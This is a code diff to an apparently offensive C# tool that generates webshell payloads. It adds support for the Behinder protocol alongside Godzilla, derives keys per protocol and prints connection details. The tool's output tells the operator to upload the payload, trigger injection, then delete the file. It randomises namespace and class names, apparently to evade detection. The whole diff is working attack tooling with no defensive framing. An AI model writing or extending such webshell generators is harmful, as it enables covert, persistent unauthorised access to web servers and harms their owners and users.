@@ -53,13 +53,15 @@ public static class GenerateCommand
             return 1;
         }
 
-        if (opts.ShellProtocol != "godzilla")
+        var validProtocols = new[] { "godzilla", "behinder" };
+        if (!validProtocols.Contains(opts.ShellProtocol))
         {
-            Console.Error.WriteLine($"Error: --shell '{opts.ShellProtocol}' not implemented. Only 'godzilla' is supported.");
+            Console.Error.WriteLine($"Error: --shell '{opts.ShellProtocol}' not supported. Valid: {string.Join(", ", validProtocols)}");
             return 1;
         }
 
-        string key = opts.Key ?? DeriveKey(opts.Password);
+        // Key derivation depends on protocol
+        string key = opts.Key ?? DeriveKey(opts.Password, opts.ShellProtocol);
         var rng = new Randomizer.SeedRandom(opts.Seed);
         string ns = rng.NextNamespace();
         string cls = rng.NextClassName();
@@ -117,12 +119,25 @@ public static class GenerateCommand
         if (opts.OutputFile != null)
             Console.WriteLine($"[+] payload: {Path.GetFullPath(opts.OutputFile)}  (type={opts.ShellType}, shell={opts.ShellProtocol}, target={opts.TargetFramework})");
         Console.WriteLine("[+] upload and access once to trigger injection, then delete the file");
-        Console.WriteLine("[+] Godzilla connection:");
-        Console.WriteLine($"    URL:    http://<target>/{virtualPath.TrimStart('/')}");
-        Console.WriteLine($"    Pass:   {opts.Password}");
-        Console.WriteLine($"    Key:    {key}");
-        Console.WriteLine($"    Enc:    AES-128 (default)");
-        Console.WriteLine($"    Type:   C#");
+
+        if (opts.ShellProtocol == "godzilla")
+        {
+            Console.WriteLine("[+] Godzilla connection:");
+            Console.WriteLine($"    URL:    http://<target>/{virtualPath.TrimStart('/')}");
+            Console.WriteLine($"    Pass:   {opts.Password}");
+            Console.WriteLine($"    Key:    {key}");
+            Console.WriteLine($"    Enc:    AES-128 (default)");
+            Console.WriteLine($"    Type:   C#");
+        }
+        else if (opts.ShellProtocol == "behinder")
+        {
+            Console.WriteLine("[+] Behinder connection:");
+            Console.WriteLine($"    URL:    http://<target>/any-existing-page");
+            Console.WriteLine($"    Pass:   {opts.Password}");
+            Console.WriteLine($"    Key:    MD5({opts.Password})[0:16]");
+            Console.WriteLine($"    Prot:   Behinder 4.x");
+        }
+
         return 0;
     }
 
@@ -137,11 +152,17 @@ public static class GenerateCommand
         return args[index];
     }
 
-    static string DeriveKey(string password)
+    static string DeriveKey(string password, string protocol)
     {
         using var md5 = System.Security.Cryptography.MD5.Create();
         byte[] hash = md5.ComputeHash(System.Text.Encoding.UTF8.GetBytes(password));
-        return BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant()[..16];
+        string hex = BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
+        return protocol switch
+        {
+            "godzilla" => hex[..16],  // first 16 hex chars as string key
+            "behinder" => hex[..16],  // first 16 hex chars (used as raw bytes in payload)
+            _ => hex[..16]
+        };
     }
 
     static string RenderTemplate(GenerateOptions opts, string ns, string cls, string key, string virtualPath)
@@ -149,15 +170,26 @@ public static class GenerateCommand
         string quotedPass = "\"" + opts.Password.Replace("\"", "\\\"") + "\"";
         string quotedKey = "\"" + key.Replace("\"", "\\\"") + "\"";
 
-        string members = Shells.GodzillaCSharp.MembersBlock
-            .Replace("{{PASSWORD}}", quotedPass)
-            .Replace("{{KEY}}", quotedKey);
+        string members, trigger, randomStr;
 
-        string trigger = Shells.GodzillaCSharp.TriggerBlock
-            .Replace("{{PASSWORD}}", quotedPass)
-            .Replace("{{KEY}}", quotedKey);
-
-        string randomStr = Shells.GodzillaCSharp.RandomStringBlock;
+        if (opts.ShellProtocol == "godzilla")
+        {
+            members = Shells.GodzillaCSharp.MembersBlock
+                .Replace("{{PASSWORD}}", quotedPass)
+                .Replace("{{KEY}}", quotedKey);
+            trigger = Shells.GodzillaCSharp.TriggerBlock
+                .Replace("{{PASSWORD}}", quotedPass)
+                .Replace("{{KEY}}", quotedKey);
+            randomStr = Shells.GodzillaCSharp.RandomStringBlock;
+        }
+        else // behinder
+        {
+            members = Shells.BehinderNet.MembersBlock
+                .Replace("{{PASSWORD}}", quotedPass);
+            trigger = Shells.BehinderNet.TriggerBlock
+                .Replace("{{PASSWORD}}", quotedPass);
+            randomStr = Shells.BehinderNet.RandomStringBlock;
+        }
 
         string template = opts.ShellType switch
         {
